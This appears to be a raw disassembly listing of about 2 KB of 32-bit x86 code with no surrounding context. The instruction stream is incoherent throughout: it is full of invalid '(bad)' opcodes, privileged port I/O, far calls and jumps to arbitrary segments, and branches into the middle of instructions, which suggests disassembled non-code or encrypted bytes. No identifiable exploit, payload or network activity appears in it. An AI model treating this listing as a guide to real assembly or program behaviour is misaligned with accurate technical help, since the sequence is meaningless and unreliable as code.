  4114cd:	scas   eax,DWORD PTR es:[edi]
  4114ce:	jo     0x411497
  4114d0:	adc    ecx,edx
  4114d2:	sbb    al,0x57
  4114d4:	xchg   esi,eax
  4114d5:	div    BYTE PTR [ebx-0xb5e36d1]
  4114db:	mov    esi,0x984b06bb
  4114e0:	adc    esi,DWORD PTR [edx-0x28]
  4114e3:	or     ch,dh
  4114e5:	hlt    
  4114e6:	cmp    ch,BYTE PTR [eax]
  4114e8:	gs out 0x54,eax
  4114eb:	mov    bh,al
  4114ed:	inc    ebx
  4114ee:	adc    al,0xb0
  4114f0:	in     eax,dx
  4114f1:	add    dl,BYTE PTR [ebp-0xe]
  4114f4:	js     0x41152a
  4114f6:	xlat   BYTE PTR ds:[ebx]
  4114f7:	retf   0xa847
  4114fa:	or     ebx,eax
  4114fc:	xor    al,0x5
  4114fe:	cdq    
  4114ff:	mov    dh,0x19
  411501:	push   edx
  411502:	data16 (bad) 
  411505:	enter  0x6d41,0x4c
  411509:	loop   0x41157d
  41150b:	iret   
  41150c:	inc    esi
  41150d:	cmp    ah,BYTE PTR ds:[ebp+0x76dd2fda]
  411514:	push   eax
  411515:	cmp    BYTE PTR [esi-0x6efb5d8d],ch
  41151b:	add    bh,0x69
  41151e:	clc    
  41151f:	loop   0x4114b7
  411521:	inc    esp
  411522:	pop    es
  411523:	mov    eax,0xe273c470
  411528:	mov    edx,0xa9ebf4cc
  41152d:	lahf   
  41152e:	mov    edi,0x7ae8c23f
  411533:	push   eax
  411534:	or     al,0x8e
  411536:	fist   WORD PTR [esi+0x27dc0af9]
  41153c:	test   eax,0xb5c2fe0d
  411541:	nop
  411542:	fstp   DWORD PTR [ecx+0x5f0f6b23]
  411548:	sbb    DWORD PTR [ebp+0x2f3db3dd],ebp
  41154e:	cld    
  41154f:	cmp    ah,BYTE PTR [esi+0x1a]
  411552:	nop
  411553:	sbb    esi,esp
  411555:	mov    dl,0xdb
  411557:	pushf  
  411558:	xchg   DWORD PTR ds:0x6f1c98a7,ecx
  41155e:	sub    dh,BYTE PTR [ebx]
  411560:	push   edi
  411561:	ja     0x4115c0
  411563:	(bad)  
  411564:	fcomp  DWORD PTR [ecx]
  411566:	mov    edi,0x2ce4cea6
  41156b:	sahf   
  41156c:	iret   
  41156d:	ins    DWORD PTR es:[edi],dx
  41156e:	gs jecxz 0x4114f2
  411571:	jns    0x411532
  411573:	shr    BYTE PTR [ecx+0x1f],0xaa
  411577:	(bad)  
  411578:	jmp    0x411504
  41157a:	and    bh,al
  41157c:	addr16 mov edi,0x22f28b82
  411582:	jo     0x411573
  411584:	gs mov bl,0x8e
  411587:	das    
  411588:	dec    ebp
  411589:	adc    edx,DWORD PTR [edx+0x29]
  41158c:	push   ss
  41158d:	add    BYTE PTR [esi],al
  41158f:	pop    es
  411590:	cmc    
  411591:	and    eax,0x80705e29
  411596:	in     al,dx
  411597:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411598:	out    0xc3,eax
  41159a:	rcl    BYTE PTR [ecx-0x1d],0x65
  41159e:	cdq    
  41159f:	mov    edx,0xea79f00b
  4115a4:	pushf  
  4115a5:	mov    ds:0x6ae8bdf4,eax
  4115aa:	out    dx,eax
  4115ab:	dec    ebx
  4115ac:	mov    cl,BYTE PTR [ecx+0x74]
  4115af:	inc    edx
  4115b0:	es dec edx
  4115b2:	push   eax
  4115b3:	mov    ecx,0x23863e27
  4115b8:	fisttp DWORD PTR [ecx+0x746db586]
  4115be:	popa   
  4115bf:	push   ds
  4115c0:	std    
  4115c1:	pop    eax
  4115c2:	jle    0x4115f6
  4115c4:	xchg   esi,eax
  4115c5:	adc    eax,0xf2821956
  4115ca:	repnz outs dx,DWORD PTR ds:[esi]
  4115cc:	out    0xe4,al
  4115ce:	adc    bl,dh
  4115d0:	adc    BYTE PTR [esp+ebx*8+0x3c],0x2e
  4115d5:	repnz xor ebx,esi
  4115d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115d9:	je     0x4115cb
  4115db:	add    eax,0x70908cb6
  4115e0:	add    al,0xe5
  4115e2:	push   edi
  4115e3:	dec    ebx
  4115e4:	push   ebx
  4115e5:	lahf   
  4115e6:	sahf   
  4115e7:	pop    edi
  4115e8:	mov    al,ch
  4115ea:	imul   edi,DWORD PTR [ebx],0xf5ffadb3
  4115f0:	pop    ss
  4115f1:	inc    ecx
  4115f2:	(bad)  
  4115f3:	inc    BYTE PTR [edi+0x1ef5d7d4]
  4115f9:	add    al,0x51
  4115fb:	inc    eax
  4115fc:	jmp    0x4115d3
  4115fe:	dec    eax
  4115ff:	(bad)  
  411600:	sub    al,0x4d
  411602:	mov    cl,0x9e
  411604:	test   al,0x83
  411606:	and    al,dl
  411608:	xchg   esp,eax
  411609:	sbb    al,0x7b
  41160b:	test   BYTE PTR [ebx-0x16],bh
  41160e:	pop    esi
  41160f:	jbe    0x4115ce
  411611:	call   0xa609:0x68f7e0f5
  411618:	(bad)  
  411619:	shr    bl,cl
  41161b:	ins    DWORD PTR es:[edi],dx
  41161c:	sahf   
  41161d:	jecxz  0x4115ea
  41161f:	jecxz  0x411608
  411621:	(bad)  
  411623:	stos   BYTE PTR es:[edi],al
  411624:	arpl   WORD PTR [ebp+ebx*1-0x153bea97],dx
  41162b:	fisttp DWORD PTR [ecx]
  41162d:	inc    edx
  41162e:	ret    
  41162f:	dec    ebp
  411630:	addr16 dec ebx
  411632:	push   ebx
  411633:	xchg   esp,eax
  411634:	iret   
  411635:	jmp    0xe30c:0x5aea6793
  41163c:	scas   al,BYTE PTR es:[edi]
  41163d:	sbb    BYTE PTR [edx+0x69b1e6a6],0xff
  411644:	arpl   WORD PTR [edx+ebp*8+0x79509024],di
  41164b:	lock outs dx,BYTE PTR ds:[esi]
  41164d:	adc    bp,WORD PTR [ebp+0x61]
  411651:	cmp    esp,DWORD PTR [edx-0x25794af]
  411657:	cmp    ecx,DWORD PTR [ecx-0x25]
  41165a:	cmp    BYTE PTR [edx],bl
  41165c:	into   
  41165d:	fcmovbe st,st(2)
  41165f:	idiv   DWORD PTR [eax]
  411661:	or     eax,0xdab4d52
  411666:	sbb    DWORD PTR [esi+0x75],edi
  411669:	lds    edx,FWORD PTR [ebx]
  41166b:	aas    
  41166c:	dec    esi
  41166d:	dec    edi
  41166e:	cld    
  41166f:	mov    ebp,0xe28bdf2a
  411674:	pop    esi
  411675:	jp     0x41162f
  411677:	scas   al,BYTE PTR es:[edi]
  411678:	mov    edi,0xae38575d
  41167d:	shr    BYTE PTR ds:0xd48a7525,1
  411683:	ja     0x411637
  411685:	adc    al,0x35
  411687:	call   0x6a06518
  41168c:	mov    BYTE PTR [ecx],bl
  41168e:	ins    DWORD PTR es:[edi],dx
  41168f:	ret    
  411690:	cmp    al,0x24
  411692:	push   0x38907b47
  411697:	rcr    BYTE PTR [bp+di+0xf],0x77
  41169c:	imul   edi,DWORD PTR [esi],0xce698478
  4116a2:	ins    BYTE PTR es:[edi],dx
  4116a3:	push   edx
  4116a4:	imul   esp,DWORD PTR [ecx],0xffffffbf
  4116a7:	add    BYTE PTR [edi],ch
  4116a9:	ins    DWORD PTR es:[edi],dx
  4116aa:	push   esi
  4116ab:	das    
  4116ac:	jmp    0xdef7f343
  4116b1:	pop    ds
  4116b2:	pop    ebx
  4116b3:	mov    bh,0x9d
  4116b5:	mov    edi,0x247c5af8
  4116ba:	inc    ebx
  4116bb:	and    ch,BYTE PTR [eax]
  4116bd:	fist   WORD PTR [ebx-0x22]
  4116c0:	xor    ebp,DWORD PTR [eax+0x4b]
  4116c3:	fld    TBYTE PTR fs:[edi]
  4116c6:	mov    ch,0x43
  4116c8:	fwait
  4116c9:	dec    edi
  4116ca:	scas   eax,DWORD PTR es:[edi]
  4116cb:	mov    ebp,0xb279f023
  4116d0:	sub    BYTE PTR [ebx+ecx*8+0x46165a90],ah
  4116d7:	test   DWORD PTR [eax],ebx
  4116d9:	xor    ecx,DWORD PTR [ebp-0x7c]
  4116dc:	clc    
  4116dd:	cmp    edi,eax
  4116df:	pop    edi
  4116e0:	mov    dh,0xd6
  4116e2:	push   DWORD PTR [edx+edx*1]
  4116e5:	jno    0x411689
  4116e7:	or     al,0x96
  4116e9:	mov    ds:0x5ca22d58,al
  4116ee:	aam    0xfb
  4116f0:	inc    esi
  4116f1:	out    0x8d,al
  4116f3:	mov    edx,0xaead6614
  4116f8:	stos   BYTE PTR es:[edi],al
  4116f9:	(bad)  
  4116fa:	out    0x81,eax
  4116fc:	or     BYTE PTR [eax+0x55],0x0
  411700:	jne    0x4116ab
  411702:	xor    ebp,DWORD PTR [edi]
  411704:	inc    eax
  411705:	je     0x411695
  411707:	bound  ebx,QWORD PTR [edi+0x45ac98dc]
  41170d:	mov    DWORD PTR [esi-0x3f7bcb15],eax
  411713:	lahf   
  411714:	sbb    al,0x3f
  411716:	sub    DWORD PTR [ecx+esi*1+0x1],edx
  41171a:	int    0x24
  41171c:	xor    DWORD PTR [ecx],edi
  41171e:	test   BYTE PTR [ecx+ecx*2-0x527efe65],bl
  411725:	retf   
  411726:	pop    eax
  411727:	jnp    0x4116fd
  411729:	dec    ecx
  41172a:	gs mov esi,edx
  41172d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172e:	call   0x3490:0x6d3105f8
  411735:	ds xor eax,0x26231b9c
  41173b:	clc    
  41173c:	push   ds
  41173d:	mov    eax,DWORD PTR [ebx]
  41173f:	push   0x81b3a840
  411744:	ins    BYTE PTR es:[edi],dx
  411745:	scas   eax,DWORD PTR es:[edi]
  411746:	popa   
  411747:	fld    TBYTE PTR [ecx+ecx*4]
  41174a:	sbb    ebp,DWORD PTR [edi-0x5f]
  41174d:	mov    BYTE PTR [edi+0x57],al
  411750:	cmp    ch,BYTE PTR [esi]
  411752:	lock imul ebx,DWORD PTR [edx-0x44e5dc2d],0xd2fa3d12
  41175d:	retf   
  41175e:	push   esi
  41175f:	(bad)  
  411760:	push   ds
  411761:	out    0x31,al
  411763:	cld    
  411764:	call   0xd0256dd7
  411769:	push   ss
  41176a:	dec    edi
  41176b:	xchg   ebx,eax
  41176c:	popf   
  41176d:	ret    0x97c9
  411770:	je     0x4117b3
  411772:	rol    dh,cl
  411774:	add    dh,BYTE PTR [ebp-0x5a]
  411777:	push   esi
  411778:	sub    DWORD PTR [ebx+0x63],ecx
  41177b:	sbb    ebp,eax
  41177d:	cld    
  41177e:	jecxz  0x411737
  411780:	jmp    0x46cbf857
  411785:	mov    eax,0x732c55fb
  41178a:	vshufpd ymm5,ymm1,YMMWORD PTR [ecx],0xf3
  41178f:	xor    BYTE PTR [ebp-0x72f7c96],0x5d
  411796:	xor    DWORD PTR [ebx+0x6a],ebx
  411799:	pop    es
  41179a:	push   edx
  41179b:	aad    0x69
  41179d:	hlt    
  41179e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179f:	daa    
  4117a0:	jnp    0x4117a9
  4117a2:	xor    eax,0x3814caba
  4117a7:	pop    esp
  4117a8:	mov    ch,0x94
  4117aa:	sub    BYTE PTR [edx-0x1f],al
  4117ad:	mov    cl,ch
  4117af:	shl    BYTE PTR [esi+0x70],0x72
  4117b3:	jecxz  0x4117b5
  4117b5:	imul   ecx
  4117b7:	mov    eax,0xd1327a43
  4117bc:	icebp  
  4117bd:	sub    bl,BYTE PTR [ebx]
  4117bf:	cmp    BYTE PTR [esi+0x5f239bee],dl
  4117c5:	sti    
  4117c6:	pmaxsw mm0,QWORD PTR [ebp+0x3417e44c]
  4117cd:	mov    eax,0xe4552a33
  4117d2:	push   es
  4117d3:	inc    esi
  4117d4:	fwait
  4117d5:	jg     0x411819
  4117d7:	ins    BYTE PTR es:[edi],dx
  4117d8:	repz jl 0x411814
  4117db:	out    0xef,al
  4117dd:	mov    dh,0x86
  4117df:	pop    ecx
  4117e0:	cmp    BYTE PTR [ebx-0x4],0xaf
  4117e4:	stos   DWORD PTR es:[edi],eax
  4117e5:	js     0x411778
  4117e7:	shl    BYTE PTR [edi-0x21],0xc5
  4117eb:	pop    ebx
  4117ec:	fs popf 
  4117ee:	test   eax,0x5c55ce22
  4117f3:	int    0x2d
  4117f5:	xor    cl,dl
  4117f7:	jp     0x41179d
  4117f9:	(bad)  
  4117fa:	cld    
  4117fb:	int3   
  4117fc:	add    al,0x5d
  4117fe:	push   cs
  4117ff:	sub    DWORD PTR [eax],ebx
  411801:	stos   DWORD PTR es:[edi],eax
  411802:	xor    esp,DWORD PTR ds:0x7ea77eed
  411808:	xchg   edi,eax
  411809:	ja     0x411877
  41180b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41180c:	loop   0x411845
  41180e:	nop
  41180f:	mov    edi,0xef2f7fa4
  411814:	shr    BYTE PTR [ebp-0x39],1
  411817:	iret   
  411818:	and    BYTE PTR [ebp+0x7f],0x13
  41181c:	push   ds
  41181d:	clc    
  41181e:	clc    
  41181f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411820:	test   DWORD PTR [eax-0x3c],ebp
  411823:	push   cs
  411824:	or     eax,0x3e2eeb04
  411829:	sbb    DWORD PTR [edi],esp
  41182b:	xchg   edx,eax
  41182c:	mov    ebx,0x360edef6
  411831:	std    
  411832:	jecxz  0x411887
  411834:	mov    edx,0x68c2b964
  411839:	dec    edi
  41183a:	rcr    DWORD PTR [esi+ecx*1+0x3a],cl
  41183e:	(bad)  
  41183f:	shr    BYTE PTR [esi],1
  411841:	mov    bh,0x23
  411843:	jbe    0x411829
  411845:	and    eax,0xbb75e944
  41184a:	mov    eax,0xf4da217
  41184f:	sbb    DWORD PTR [ecx+eiz*1-0x3f],eax
  411853:	fdivr  DWORD PTR [ebx-0x51]
  411856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411857:	xchg   esi,eax
  411858:	sub    ebp,DWORD PTR [ebp-0x67]
  41185b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41185c:	clc    
  41185d:	jmp    0x4117fb
  41185f:	sbb    DWORD PTR [edx+0x6bb79922],ebx
  411865:	adc    esi,DWORD PTR [ebx]
  411867:	cmc    
  411868:	and    al,0x39
  41186a:	adc    bl,BYTE PTR [edi+eiz*1]
  41186d:	push   esp
  41186e:	les    esi,FWORD PTR [eax+0x7236c9af]
  411874:	scas   eax,DWORD PTR es:[edi]
  411875:	xchg   ebx,eax
  411876:	shl    BYTE PTR [eax-0x62],1
  411879:	push   ebx
  41187a:	pop    ebx
  41187b:	call   0x30dd:0xa9782ab0
  411882:	add    esi,edx
  411884:	mov    BYTE PTR [ebp-0x3e],dl
  411887:	dec    edi
  411888:	frstor [ecx-0x116af51e]
  41188e:	push   edx
  41188f:	or     DWORD PTR [edi+0x29427012],edi
  411895:	stos   DWORD PTR es:[edi],eax
  411896:	fld    TBYTE PTR [ecx]
  411898:	add    eax,DWORD PTR [ebx]
  41189a:	gs movlhps xmm0,xmm0
  41189e:	mov    cl,0x2d
  4118a0:	or     eax,0x65262875
  4118a5:	sbb    edi,ebp
  4118a7:	bound  eax,QWORD PTR [edi-0x35]
  4118aa:	idiv   BYTE PTR [esi-0xb]
  4118ad:	xchg   esi,eax
  4118ae:	aaa    
  4118af:	push   ds
  4118b0:	xchg   esp,eax
  4118b1:	js     0x41183a
  4118b3:	or     BYTE PTR [eax-0x4a],ah
  4118b6:	sub    ecx,DWORD PTR [esi]
  4118b8:	clc    
  4118b9:	and    edi,edi
  4118bb:	into   
  4118bc:	iret   
  4118bd:	jns    0x411932
  4118bf:	(bad)  
  4118c1:	stos   DWORD PTR es:[edi],eax
  4118c2:	jmp    0xae8c:0xbf0fd08c
  4118c9:	jge    0x41184e
  4118cb:	(bad)  
  4118cc:	pop    edx
  4118cd:	or     al,0x22
  4118cf:	mov    ds:0xe25b392a,eax
  4118d4:	jne    0x4118e3
  4118d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118d7:	sub    dh,BYTE PTR [eax+edx*4+0x32]
  4118db:	add    esi,DWORD PTR [edx]
  4118dd:	mov    ah,0xa6
  4118df:	dec    edi
  4118e0:	lahf   
  4118e1:	sti    
  4118e2:	cmc    
  4118e3:	push   es
  4118e4:	jb     0x41188d
  4118e6:	dec    esp
  4118e7:	add    eax,0xf8feffa6
  4118ec:	sub    al,0xb0
  4118ee:	xchg   esi,eax
  4118ef:	sahf   
  4118f0:	xchg   BYTE PTR [ecx],ah
  4118f2:	mov    ah,0x69
  4118f4:	jmp    0x41196a
  4118f6:	xor    ebx,ebp
  4118f8:	outs   dx,DWORD PTR ds:[esi]
  4118f9:	and    BYTE PTR [ebx+0x2b],ch
  4118fc:	ss add al,0xb4
  4118ff:	mov    ecx,0xf96274c9
  411904:	adc    dh,BYTE PTR [eax+0x22]
  411907:	test   al,0xfe
  411909:	xchg   edi,eax
  41190a:	dec    ebx
  41190b:	xchg   DWORD PTR [esi-0x44],edi
  41190e:	push   edi
  41190f:	and    BYTE PTR [eax+0x7000ef38],cl
  411915:	or     al,0x3b
  411917:	(bad)  
  411918:	mov    ecx,0xd9226f9c
  41191d:	stc    
  41191e:	hlt    
  41191f:	jecxz  0x411960
  411921:	mov    al,ds:0x42b6d464
  411926:	imul   ecx,edi,0xb06390bb
  41192c:	inc    ebx
  41192d:	rcl    DWORD PTR [ecx+eiz*1+0x63e41454],0xcd
  411935:	out    dx,al
  411936:	jnp    0x4119a3
  411938:	stc    
  411939:	add    eax,0x7a00be0b
  41193e:	lds    ebp,FWORD PTR ss:[ecx+0x6]
  411942:	sub    eax,0x6673d4ab
  411947:	xor    dl,BYTE PTR [ebp+0x2f]
  41194a:	out    0xb5,eax
  41194c:	or     DWORD PTR [ebp+0x695da432],edi
  411952:	jno    0x411932
  411954:	sub    eax,0x5e346463
  411959:	in     al,dx
  41195a:	jb     0x41192d
  41195c:	pop    esp
  41195d:	and    DWORD PTR [eax+ecx*8],ebp
  411960:	adc    BYTE PTR [ebp-0x181c4334],ah
  411966:	and    BYTE PTR [edi+eiz*4],dh
  411969:	retf   0xc82c
  41196c:	fdivr  QWORD PTR [ebx+edi*4+0x32b8c5b0]
  411973:	xchg   ecx,eax
  411974:	popf   
  411975:	jle    0x411965
  411977:	dec    esi
  411978:	arpl   WORD PTR [ecx+ebx*8+0x56],bx
  41197c:	pop    esi
  41197d:	mov    al,ds:0xe1fa5b3a
  411982:	pop    eax
  411983:	aam    0xf7
  411985:	ror    BYTE PTR [ecx+0xaade247],0x63
  41198c:	adc    dh,bh
  41198e:	mov    ds:0x7f206000,al
  411993:	xchg   edx,eax
  411994:	shl    BYTE PTR [eax],cl
  411996:	and    BYTE PTR [esi+edx*1+0x5],cl
  41199a:	push   es
  41199b:	(bad)  
  41199c:	jbe    0x4119a9
  41199e:	sub    BYTE PTR [eax],0xf
  4119a1:	mov    edx,0x5736dcc
  4119a6:	icebp  
  4119a7:	mov    esp,0xa076181f
  4119ac:	xchg   DWORD PTR [esi],esp
  4119ae:	(bad)  
  4119af:	pop    ebp
  4119b0:	jno    0x4119a1
  4119b2:	neg    ah
  4119b4:	out    0x23,eax
  4119b6:	retf   0x3448
  4119b9:	mov    ah,BYTE PTR [edi+0x15]
  4119bc:	fistp  DWORD PTR [edi+0x4941625d]
  4119c2:	add    cl,BYTE PTR [ebp-0x7672a1f3]
  4119c8:	(bad)  
  4119c9:	mov    cl,0x24
  4119cb:	out    0xbb,al
  4119cd:	in     al,dx
  4119ce:	cdq    
  4119cf:	dec    edx
  4119d0:	sbb    al,0x49
  4119d2:	xchg   ebp,eax
  4119d3:	mov    es,WORD PTR [edx]
  4119d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119d6:	loop   0x411a28
  4119d8:	xor    ch,bh
  4119da:	and    esi,0x6730e4aa
  4119e0:	jno    0x411a2f
  4119e2:	adc    eax,0x9fe12b76
  4119e7:	or     ebx,DWORD PTR [esi+0x4d]
  4119ea:	in     eax,0x57
  4119ec:	mov    ebx,ds
  4119ee:	retf   
  4119ef:	push   es
  4119f0:	cdq    
  4119f1:	mov    es,WORD PTR [edi-0x10]
  4119f4:	sub    eax,0x1e0ad505
  4119f9:	pop    ebp
  4119fa:	push   ebx
  4119fb:	pushf  
  4119fc:	add    bh,al
  4119fe:	bound  esi,QWORD PTR [esi+0x63576655]
  411a04:	mov    ebp,0xe1e0bd74
  411a09:	mov    bl,0xd8
  411a0b:	inc    edx
  411a0c:	out    0xb7,eax
  411a0e:	in     eax,0x62
  411a10:	inc    ecx
  411a11:	adc    BYTE PTR [eax-0x39],dh
  411a14:	xchg   esp,eax
  411a15:	sub    al,0xce
  411a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a18:	loopne 0x4119c8
  411a1a:	not    DWORD PTR [esi+0x66]
  411a1d:	push   ebp
  411a1e:	mov    ah,BYTE PTR [edi+0x37]
  411a21:	pop    eax
  411a22:	test   eax,0xf6cb5af1
  411a27:	leave  
  411a28:	pop    esp
  411a29:	inc    ecx
  411a2a:	(bad)  
  411a2b:	cmp    esp,ecx
  411a2d:	dec    DWORD PTR [ecx+edx*2]
  411a30:	leave  
  411a31:	arpl   WORD PTR [edx],bx
  411a33:	jno    0x411a34
  411a35:	popf   
  411a36:	call   0x3ab1:0xc2447989
  411a3d:	jg     0x411a05
  411a3f:	sub    ecx,edx
  411a41:	in     eax,dx
  411a42:	xchg   ecx,eax
  411a43:	(bad)  
  411a44:	sub    al,0xb2
  411a46:	scas   eax,DWORD PTR es:[edi]
  411a47:	xor    al,BYTE PTR [ebx]
  411a49:	mov    bl,0x37
  411a4b:	bound  esi,QWORD PTR [esi+ebp*1]
  411a4e:	mov    ch,0x5b
  411a50:	mov    bh,0x61
  411a52:	mov    ch,ah
  411a54:	div    DWORD PTR [ecx]
  411a56:	bound  ebx,QWORD PTR [ebp-0x2c]
  411a59:	push   ecx
  411a5a:	inc    ecx
  411a5b:	aas    
  411a5c:	push   esp
  411a5d:	mov    edi,0xf72eae4
  411a62:	xor    al,0x41
  411a64:	out    0xbe,eax
  411a66:	mov    al,ds:0xa254fe58
  411a6b:	mov    cl,0xc4
  411a6d:	and    dl,bl
  411a6f:	xor    eax,0x688eba8f
  411a74:	jmp    0x299646e6
  411a79:	jp     0x411aaf
  411a7b:	test   eax,0xd9244fbd
  411a80:	(bad)  
  411a81:	add    BYTE PTR [eax-0x1f],cl
  411a84:	fs inc ebp
  411a86:	clc    
  411a87:	xchg   ecx,eax
  411a88:	push   ebp
  411a89:	and    al,0x96
  411a8b:	inc    edx
  411a8c:	dec    ebx
  411a8d:	mov    edi,eax
  411a8f:	(bad)  
  411a90:	xchg   edx,eax
  411a91:	pushf  
  411a92:	outs   dx,DWORD PTR ds:[esi]
  411a93:	inc    ebp
  411a94:	outs   dx,BYTE PTR ds:[esi]
  411a95:	scas   al,BYTE PTR es:[edi]
  411a96:	push   ecx
  411a97:	xor    al,BYTE PTR [ebp-0x529b902e]
  411a9d:	arpl   di,di
  411a9f:	inc    esp
  411aa0:	je     0x411af3
  411aa2:	pop    edi
  411aa3:	mov    ebp,0xef20c727
  411aa8:	fadd   QWORD PTR [ebp-0x55]
  411aab:	into   
  411aac:	add    dh,BYTE PTR [ebp-0x15]
  411aaf:	repnz mov edx,ss
  411ab2:	inc    ecx
  411ab3:	test   BYTE PTR [ecx],ah
  411ab5:	xchg   ch,bl
  411ab7:	pop    ss
  411ab8:	mov    dh,0xd8
  411aba:	jno    0x411aa5
  411abc:	xchg   ebx,ecx
  411abe:	test   DWORD PTR [edi],edx
  411ac0:	mov    eax,ds:0xb8402866
  411ac5:	cmp    BYTE PTR [edx],dh
  411ac7:	outs   dx,BYTE PTR ds:[esi]
  411ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ac9:	(bad)  
  411aca:	mov    edi,0xcfcd1995
  411acf:	mov    esp,DWORD PTR [ebp-0x3c5244a9]
  411ad5:	fiadd  WORD PTR [edx-0x51]
  411ad8:	mov    esp,0x435b1d38
  411add:	cwde   
  411ade:	sub    esi,edi
  411ae0:	push   esp
  411ae1:	pop    ss
  411ae2:	ja     0x411ab6
  411ae4:	scas   al,BYTE PTR es:[edi]
  411ae5:	push   ecx
  411ae6:	lahf   
  411ae7:	mov    ah,0x9e
  411ae9:	mov    dl,al
  411aeb:	inc    edi
  411aec:	out    0xd7,al
  411aee:	cmp    eax,DWORD PTR [eax-0x37]
  411af1:	mov    ecx,0xdf248e33
  411af6:	arpl   WORD PTR [edx-0x59],si
  411af9:	fiadd  WORD PTR cs:[edi]
  411afc:	out    dx,eax
  411afd:	out    dx,eax
  411afe:	and    eax,0x563c2d27
  411b03:	inc    edx
  411b04:	adc    ecx,DWORD PTR [edx+0x20]
  411b07:	mov    bh,0x21
  411b09:	or     bl,dl
  411b0b:	outs   dx,DWORD PTR ds:[esi]
  411b0c:	fmul   st(4),st
  411b0e:	xor    DWORD PTR [eax],0xffffffb3
  411b11:	fdiv   st,st(6)
  411b13:	comiss xmm5,xmm4
  411b16:	cmp    al,ah
  411b18:	fsubr  QWORD PTR [esp+ecx*1]
  411b1b:	test   BYTE PTR ds:0x3b850323,dh
  411b21:	outs   dx,DWORD PTR ds:[esi]
  411b22:	rcl    ebp,1
  411b24:	adc    bh,cl
  411b26:	iret   
  411b27:	ins    BYTE PTR es:[edi],dx
  411b28:	in     eax,0x54
  411b2a:	sbb    DWORD PTR [edi-0x728c3db6],ecx
  411b30:	lock pop ebx
  411b32:	lods   eax,DWORD PTR ds:[esi]
  411b33:	rcr    DWORD PTR [esi-0x998c3d5],cl
  411b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b3a:	and    ecx,ebp
  411b3c:	gs fs mov ebp,0x500f3db
  411b43:	sub    al,0xf1
  411b45:	addr16 pop esi
  411b47:	lea    edx,[edx]
  411b49:	ins    BYTE PTR es:[edi],dx
  411b4a:	jge    0x411bbd
  411b4c:	xor    BYTE PTR [ebx-0x5d],bh
  411b4f:	loop   0x411bb8
  411b51:	retf   
  411b52:	xor    bh,cl
  411b54:	fisttp QWORD PTR [eax-0x5279a54e]
  411b5a:	and    BYTE PTR ds:0x9b318422,dl
  411b60:	mov    ebp,0x42979ba3
  411b65:	add    DWORD PTR [esi],0x77
  411b68:	xlat   BYTE PTR ds:[ebx]
  411b69:	pop    es
  411b6a:	sbb    BYTE PTR [ebp+0x25c4339b],al
  411b70:	pusha  
  411b71:	(bad)  
  411b72:	ins    DWORD PTR es:[edi],dx
  411b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b74:	pop    esp
  411b75:	scas   eax,DWORD PTR es:[edi]
  411b76:	test   al,0x54
  411b78:	dec    esi
  411b79:	dec    BYTE PTR [eax+0x469a69a9]
  411b7f:	mov    ah,BYTE PTR [edi-0x3cad9fb]
  411b85:	fist   DWORD PTR [eax]
  411b87:	lock clc 
  411b89:	stc    
  411b8a:	or     al,BYTE PTR [edx]
  411b8c:	pop    esi
  411b8d:	dec    esi
  411b8e:	dec    ecx
  411b8f:	jo     0x411b68
  411b91:	cmp    DWORD PTR [esp+edx*2],edi
  411b94:	push   es
  411b95:	and    DWORD PTR [ebx],0xffffffb1
  411b98:	fs aam 0xab
  411b9b:	mov    ebp,0xd7760976
  411ba0:	or     al,0x1a
  411ba2:	push   ecx
  411ba3:	call   0xc02c:0x5aeca0b3
  411baa:	jmp    0xd6c4:0xf0ff4522
  411bb1:	xor    cl,al
  411bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb4:	push   0xb
  411bb6:	and    BYTE PTR [edx+0x6b],0x45
  411bba:	test   eax,0x13ac78c7
  411bbf:	push   esi
  411bc0:	mov    ecx,0xcbfa09be
  411bc5:	inc    esp
  411bc6:	adc    cl,cl
  411bc8:	mov    edx,gs
  411bca:	jl     0x411bc7
  411bcc:	lods   eax,DWORD PTR ds:[esi]
  411bcd:	push   ds
  411bce:	div    ebp
  411bd0:	push   ecx
  411bd1:	sbb    eax,0x2738d15f
  411bd6:	not    BYTE PTR [edi+0x7e]
  411bd9:	ret    0x6eb6
  411bdc:	dec    esi
  411bdd:	lods   eax,DWORD PTR ds:[esi]
  411bde:	and    al,0xfb
  411be0:	in     eax,0x24
  411be2:	rcr    DWORD PTR [ebx+0x502c311f],0x7f
  411be9:	add    ah,BYTE PTR [ebp-0x42]
  411bec:	sub    al,0x93
  411bee:	jmp    0x45a2:0x111d6c2
  411bf5:	cmc    
  411bf6:	rcr    DWORD PTR [eax+0x10],1
  411bf9:	loope  0x411c06
  411bfb:	sbb    bl,BYTE PTR [ebx+0x53]
  411bfe:	cs cld 
  411c00:	aaa    
  411c01:	push   eax
  411c02:	es jns 0x411c4a
  411c05:	rcl    BYTE PTR [ebx],cl
  411c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c08:	jmp    0x747bd41f
  411c0d:	popf   
  411c0e:	aad    0x6e
  411c10:	ja     0x411c8e
  411c12:	mov    cl,0x5a
  411c14:	mov    eax,0x47ddf228
  411c19:	movd   mm3,DWORD PTR [ecx]
  411c1c:	enter  0x5aaf,0x76
  411c20:	lods   al,BYTE PTR ds:[esi]
  411c21:	mov    ebp,0x38cba609
  411c26:	out    0x20,eax
  411c28:	inc    BYTE PTR [ecx-0x69d6eaf7]
  411c2e:	test   ah,bl
  411c30:	sbb    esp,0xfffffff0
  411c33:	mov    ebp,0x211b78a6
  411c38:	ss nop
  411c3a:	lahf   
  411c3b:	imul   esi,DWORD PTR [edx+0x26],0x4138e358
  411c42:	mov    esi,0xd1fafff7
  411c47:	hlt    
  411c48:	inc    ecx
  411c49:	pop    edx
  411c4a:	add    ch,BYTE PTR [ecx+ecx*2+0x79]
